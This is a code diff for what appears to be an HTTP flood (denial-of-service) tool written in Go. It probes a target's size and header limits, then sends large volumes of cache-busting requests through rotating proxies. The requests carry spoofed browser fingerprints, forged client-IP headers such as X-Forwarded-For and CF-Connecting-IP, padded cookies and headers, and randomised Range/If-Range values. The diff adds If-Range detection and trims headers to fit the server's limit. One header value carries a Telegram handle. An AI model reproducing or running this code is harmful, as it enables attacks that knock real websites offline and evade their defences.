@@ -23,7 +23,7 @@ import (
 
 const (
 	wrk        = 1500
-	to         = 6 * time.Second
+	to         = 5 * time.Second
 	sub        = 5
 	KEEP_ALIVE = 30 * time.Second
 )
@@ -139,6 +139,7 @@ type CLI struct {
 type Capabilities struct {
 	Headers map[string]bool
 	Range   bool
+	IfRange bool
 }
 
 func init() {
@@ -168,7 +169,7 @@ func Detect_Pyload(target string) int {
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
 	}
-	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
+	sizes := []int{64, 128, 256, 512, 1024}
 	lastSuccess := 0
 	for _, size := range sizes {
 		testURL := target
@@ -202,7 +203,7 @@ func Detect_Header_Support(target string) int {
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
 	}
-	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
+	sizes := []int{512, 1024}
 	lastSuccess := 0
 	for _, size := range sizes {
 		req, _ := http.NewRequest("GET", target, nil)
@@ -276,7 +277,7 @@ func Detect_Headers_Costum(target string, proxyIP string) Capabilities {
 		case "Accept-Datetime":
 			req.Header.Set(h, time.Now().Format(time.RFC1123))
 		case "From":
-			req.Header.Set(h, "test@example.com")
+			req.Header.Set(h, "t.me/ytdizflzye.com")
 		case "Max-Forwards":
 			req.Header.Set(h, "5")
 		case "Via":
@@ -322,10 +323,59 @@ func Detect_Headers_Costum(target string, proxyIP string) Capabilities {
 		resp.Body.Close()
 	}
 
+	ifRangeSupported := false
+	if rangeSupported {
+		req, _ = http.NewRequest("GET", target, nil)
+		req.Header.Set("Range", "bytes=0-0")
+		req.Header.Set("If-Range", `"fake-etag-`+RST(rng, 8)+`"`)
+		resp, err = client.Do(req)
+		if err == nil {
+			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusPartialContent {
+				ifRangeSupported = true
+			}
+			resp.Body.Close()
+		}
+	}
+
 	return Capabilities{
 		Headers: result,
 		Range:   rangeSupported,
+		IfRange: ifRangeSupported,
 	}
+}
+
+func Detect_Max_Total_Header_Size(target string) int {
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	sizes := []int{0, 512, 1024, 2048, 4096, 8192, 16384}
+	lastSuccess := 0
+	for _, size := range sizes {
+		req, _ := http.NewRequest("GET", target, nil)
+		req.Header.Set("User-Agent", "Mozilla/5.0")
+		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Connection", "close")
+		if size > 0 {
+			req.Header.Set("X-Filler", strings.Repeat("x", size))
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			break
+		}
+		resp.Body.Close()
+		code := resp.StatusCode
+		if code >= 200 && code < 400 {
+			lastSuccess = size
+		} else if code == 431 || code == 400 || code == 413 {
+			break
+		} else {
+			lastSuccess = size
+		}
+	}
+	return lastSuccess
 }
 
 func main() {
@@ -378,6 +428,7 @@ func main() {
 	maxPayload := Detect_Pyload(tgt)
 	maxHeader := Detect_Header_Support(tgt)
 	caps := Detect_Headers_Costum(tgt, proxyIP)
+	maxTotalHeader := Detect_Max_Total_Header_Size(tgt)
 
 	wcs := make([]CLI, len(proxies))
 	for i, proxyURL := range proxies {
@@ -407,8 +458,8 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   5 * time.Second,
-			ResponseHeaderTimeout: 5 * time.Second,
+			TLSHandshakeTimeout:   4 * time.Second,
+			ResponseHeaderTimeout: 3 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
 		}
 		ip := ""
@@ -489,34 +540,36 @@ func main() {
 
 						req, _ := http.NewRequest("GET", reqURL, nil)
 
-						req.Header.Set("User-Agent", prof.UA)
-						req.Header.Set("Accept", prof.Accept)
-						req.Header.Set("Accept-Language", prof.Lang)
-						req.Header.Set("Accept-Encoding", prof.Encoding)
-						req.Header.Set("Connection", "keep-alive")
-						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-						req.Header.Set("Pragma", "no-cache")
-						req.Header.Set("Upgrade-Insecure-Requests", "1")
-						req.Header.Set("If-Modified-Since", ifModifiedSince)
-						req.Header.Set("X-Cache-Buster", strconv.FormatInt(subRng.Int63(), 16))
+						headerMap := make(map[string]string)
+
+						headerMap["User-Agent"] = prof.UA
+						headerMap["Accept"] = prof.Accept
+						headerMap["Accept-Language"] = prof.Lang
+						headerMap["Accept-Encoding"] = prof.Encoding
+						headerMap["Connection"] = "keep-alive"
+						headerMap["Cache-Control"] = "no-cache, no-store, must-revalidate"
+						headerMap["Pragma"] = "no-cache"
+						headerMap["Upgrade-Insecure-Requests"] = "1"
+						headerMap["If-Modified-Since"] = ifModifiedSince
+						headerMap["X-Cache-Buster"] = strconv.FormatInt(subRng.Int63(), 16)
 
 						if caps.Headers["X-Original-URL"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(subRng.Int63(), 16))
+							headerMap["X-Original-URL"] = "/" + strconv.FormatInt(subRng.Int63(), 16)
 						}
 						if caps.Headers["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Forwarded-Host", strconv.FormatInt(subRng.Int63(), 16)+".example.com")
+							headerMap["X-Forwarded-Host"] = strconv.FormatInt(subRng.Int63(), 16) + ".example.com"
 						}
 						if caps.Headers["X-Request-ID"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
+							headerMap["X-Request-ID"] = strconv.FormatInt(subRng.Int63(), 16)
 						}
 						if caps.Headers["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
-							req.Header.Set("CF-Connecting-IP", cli.ip)
+							headerMap["CF-Connecting-IP"] = cli.ip
 						}
 						if caps.Headers["True-Client-IP"] && subRng.Intn(5) == 0 {
-							req.Header.Set("True-Client-IP", cli.ip)
+							headerMap["True-Client-IP"] = cli.ip
 						}
 						if caps.Headers["CDN-Loop"] && subRng.Intn(5) == 0 {
-							req.Header.Set("CDN-Loop", "cloudflare")
+							headerMap["CDN-Loop"] = "cloudflare"
 						}
 
 						for h, supported := range caps.Headers {
@@ -529,68 +582,76 @@ func main() {
 							switch h {
 							case "X-Original-URL", "X-Forwarded-Host", "X-Request-ID", "CDN-Loop", "CF-Connecting-IP", "True-Client-IP":
 							case "X-Client-IP", "X-Remote-IP", "X-Originating-IP":
-								req.Header.Set(h, cli.ip)
+								headerMap[h] = cli.ip
 							case "X-Forwarded-Proto":
-								req.Header.Set(h, []string{"http", "https"}[subRng.Intn(2)])
+								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
 							case "X-Forwarded-Port":
-								req.Header.Set(h, strconv.Itoa(80+subRng.Intn(100)))
+								headerMap[h] = strconv.Itoa(80 + subRng.Intn(100))
 							case "X-Forwarded-Scheme":
-								req.Header.Set(h, []string{"http", "https"}[subRng.Intn(2)])
+								headerMap[h] = []string{"http", "https"}[subRng.Intn(2)]
 							case "X-Requested-With":
-								req.Header.Set(h, "XMLHttpRequest")
+								headerMap[h] = "XMLHttpRequest"
 							case "Accept-Charset":
-								req.Header.Set(h, "utf-8, iso-8859-1;q=0.5")
+								headerMap[h] = "utf-8, iso-8859-1;q=0.5"
 							case "Accept-Datetime":
-								req.Header.Set(h, time.Now().Add(-time.Duration(subRng.Intn(3600))*time.Second).Format(time.RFC1123))
+								headerMap[h] = time.Now().Add(-time.Duration(subRng.Intn(3600)) * time.Second).Format(time.RFC1123)
 							case "From":
-								req.Header.Set(h, RST(subRng, 8)+"@example.com")
+								headerMap[h] = RST(subRng, 8) + "@example.com"
 							case "Max-Forwards":
-								req.Header.Set(h, strconv.Itoa(1+subRng.Intn(10)))
+								headerMap[h] = strconv.Itoa(1 + subRng.Intn(10))
 							case "Via":
-								req.Header.Set(h, fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100)))
+								headerMap[h] = fmt.Sprintf("1.1 proxy-%d.example.com", subRng.Intn(100))
 							case "Warning":
-								req.Header.Set(h, fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10)))
+								headerMap[h] = fmt.Sprintf("%d %s", 100+subRng.Intn(20), RST(subRng, 10))
 							case "DNT":
-								req.Header.Set(h, "1")
+								headerMap[h] = "1"
 							case "Upgrade":
-								req.Header.Set(h, "websocket")
+								headerMap[h] = "websocket"
 							case "Save-Data":
-								req.Header.Set(h, "on")
+								headerMap[h] = "on"
 							case "X-HTTP-Method-Override":
-								req.Header.Set(h, []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)])
+								headerMap[h] = []string{"PUT", "DELETE", "PATCH"}[subRng.Intn(3)]
 							case "X-Cache":
-								req.Header.Set(h, []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)])
+								headerMap[h] = []string{"MISS", "HIT", "EXPIRED"}[subRng.Intn(3)]
 							}
 						}
 
 						if subRng.Intn(2) == 0 {
 							randHeader := "X-" + RST(subRng, 8)
-							req.Header.Set(randHeader, RST(subRng, 16))
+							headerMap[randHeader] = RST(subRng, 16)
 						}
 
 						if subRng.Intn(4) == 0 {
-							bigCookie := "big=" + strings.Repeat("x", 2048+subRng.Intn(4096))
-							if c := req.Header.Get("Cookie"); c != "" {
-								req.Header.Set("Cookie", c+"; "+bigCookie)
+							bigCookie := "big=" + strings.Repeat("x", 512+subRng.Intn(1024))
+							if existing, ok := headerMap["Cookie"]; ok {
+								headerMap["Cookie"] = existing + "; " + bigCookie
 							} else {
-								req.Header.Set("Cookie", bigCookie)
+								headerMap["Cookie"] = bigCookie
 							}
 						}
 
 						if subRng.Intn(4) == 0 {
 							ref := REF[subRng.Intn(len(REF))]
 							ref += RST(subRng, 16) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
-							req.Header.Set("Referer", ref)
+							headerMap["Referer"] = ref
 						}
 
 						if caps.Range && subRng.Intn(4) == 0 {
 							start := subRng.Intn(10000)
 							end := start + 1000 + subRng.Intn(5000)
-							req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
+							headerMap["Range"] = fmt.Sprintf("bytes=%d-%d", start, end)
+							if caps.IfRange && subRng.Intn(2) == 0 {
+								if subRng.Intn(2) == 0 {
+									headerMap["If-Range"] = `"` + RST(subRng, 16) + `"`
+								} else {
+									past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
+									headerMap["If-Range"] = past
+								}
+							}
 						}
 
 						if subRng.Intn(5) == 0 {
-							req.Header.Set("X-Real-IP", cli.ip)
+							headerMap["X-Real-IP"] = cli.ip
 						}
 
 						if maxHeader > 0 && subRng.Intn(2) == 0 {
@@ -598,7 +659,7 @@ func main() {
 							if size < 1 {
 								size = 512
 							}
-							req.Header.Set("X-Large-Data", strings.Repeat("x", size))
+							headerMap["X-Large-Data"] = strings.Repeat("x", size)
 						}
 
 						var cookies []string
@@ -611,30 +672,59 @@ func main() {
 							}
 						}
 						if len(cookies) > 0 {
-							req.Header.Set("Cookie", strings.Join(cookies, "; "))
+							if existing, ok := headerMap["Cookie"]; ok {
+								headerMap["Cookie"] = existing + "; " + strings.Join(cookies, "; ")
+							} else {
+								headerMap["Cookie"] = strings.Join(cookies, "; ")
+							}
 						}
 
 						if subRng.Intn(8) != 0 {
 							ref := REF[subRng.Intn(len(REF))]
-							req.Header.Set("Referer", ref+host)
+							headerMap["Referer"] = ref + host
 						}
 
 						if prof.SecChUa != "" {
-							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
-							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
-							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
+							headerMap["Sec-Ch-Ua"] = prof.SecChUa
+							headerMap["Sec-Ch-Ua-Mobile"] = prof.SecChUaMov
+							headerMap["Sec-Ch-Ua-Platform"] = prof.SecChUaPlat
 						}
 
-						req.Header.Set("Sec-Fetch-Site", "none")
-						req.Header.Set("Sec-Fetch-Mode", "navigate")
-						req.Header.Set("Sec-Fetch-Dest", "document")
+						headerMap["Sec-Fetch-Site"] = "none"
+						headerMap["Sec-Fetch-Mode"] = "navigate"
+						headerMap["Sec-Fetch-Dest"] = "document"
 
 						PID := cli.ip
 						if PID == "" {
 							PID = RIP(subRng)
 						}
-						req.Header.Set("X-Forwarded-For", PID)
-						req.Header.Set("X-Real-IP", PID)
+						headerMap["X-Forwarded-For"] = PID
+						headerMap["X-Real-IP"] = PID
+
+						if maxTotalHeader > 0 {
+							totalSize := 0
+							for k, v := range headerMap {
+								totalSize += len(k) + len(v) + 4
+							}
+							required := map[string]bool{
+								"User-Agent": true, "Accept": true, "Accept-Language": true,
+								"Accept-Encoding": true, "Connection": true,
+							}
+							for totalSize > maxTotalHeader && len(headerMap) > 10 {
+								for k := range headerMap {
+									if required[k] {
+										continue
+									}
+									totalSize -= len(k) + len(headerMap[k]) + 4
+									delete(headerMap, k)
+									break
+								}
+							}
+						}
+
+						for k, v := range headerMap {
+							req.Header.Set(k, v)
+						}
 
 						resp, err := cli.client.Do(req)
 						if err == nil {
